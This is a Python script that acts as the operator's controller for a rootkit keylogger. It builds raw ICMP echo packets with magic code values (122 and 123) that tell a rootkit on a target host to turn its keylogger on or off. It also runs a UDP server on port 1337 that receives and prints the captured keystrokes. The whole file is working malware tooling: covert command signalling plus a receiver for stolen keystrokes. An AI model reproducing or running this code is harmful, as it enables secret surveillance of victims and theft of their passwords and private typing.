import time
import socket
import struct
import select
import sys
import os
import getopt
import random
import asyncore

ICMP_ECHO_REQUEST = 8 # Seems to be the same on Solaris.
ICMP_CODE = socket.getprotobyname('icmp')

ROOTKIT_KEYLOGGER_ACTIVATE = 122
ROOTKIT_KEYLOGGER_DEACTIVATE = 123


def checksum(source_string):
    # I'm not too confident that this is right but testing seems to
    # suggest that it gives the same answers as in_cksum in ping.c.
    sum = 0
    count_to = (len(source_string) / 2) * 2
    count = 0
    while count < count_to:
        this_val = ord(source_string[count + 1])*256+ord(source_string[count])
        sum = sum + this_val
        sum = sum & 0xffffffff # Necessary?
        count = count + 2
    if count_to < len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff # Necessary?
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    # Swap bytes. Bugger me if I know why.
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer


def create_packet(code):
    """Create a new echo request packet based on the given "code" Code is id and code.."""
    # Header is type (8), code (8), checksum (16), id (16), sequence (16)
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, code, 0, code, 1)
    data = 192 * 'Q'
    # Calculate the checksum on the data and the dummy header.
    my_checksum = checksum(header + data)
    # Now that we have the right checksum, we put that in. It's just easier
    # to make up a new header than to stuff it into the dummy.
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, code, socket.htons(my_checksum), code, 1)
    return header + data


def send_message(dest_addr, code):
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
    host = socket.gethostbyname(dest_addr)
    
    packet = create_packet(code)
    while packet:
        # The icmp protocol does not use a port, but the function
        # below expects it, so we just give it a dummy port.
        sent = my_socket.sendto(packet, (dest_addr, 1))
        packet = packet[sent:]
    my_socket.close()

def get_ip(args):
    return 1

def print_usage():
    print "usage:", sys.argv[0], "\t[-a key] [-d key] [-h <host>]"
    print "\t\t\t\t[-u]"
    print "-a key\t","sends a magic package to the rootkit and activates the keylogger"
    print "-d key\t","sends a magic package to the rootkit and deactivates the keylogger"
    print "-h <host>\t", "the ip for the host where the rootkit is running"
    print "-u", "start a socket to receive the keys from the keylogger"

def is_admin():
    if not os.geteuid()==0:
        sys.exit("\nYou must be root to run the application with this option, please use sudo and try again.\n")  

def getNetworkIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('google.at', 0))
    return s.getsockname()[0]

def start_socket(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (getNetworkIp(), port)
    sock.bind(server_address)
    print "UPD Server is waiting for messages on port:", port
    while True:
        data, address = sock.recvfrom(20)
        sys.stdout.write(data)
        sys.stdout.flush()
        if data == "_ENTER_":
            print ""
code = 0
host = ""
start_udp_socket = False
options, remainder =  getopt.getopt(sys.argv[1:], 'a:d:h:u',[])
if len(sys.argv) != 1:
    for opt, arg in options:
        if opt == "-a" and arg == "key":
            code = ROOTKIT_KEYLOGGER_ACTIVATE
        elif opt == "-d" and arg == "key":
            code = ROOTKIT_KEYLOGGER_DEACTIVATE
        elif opt == "-h":
            host = arg
        elif opt == "-u":
            start_udp_socket = True

    if start_udp_socket:
        start_socket(1337)
    else:
        is_admin()
        send_message(host, code)
else:
    print_usage()


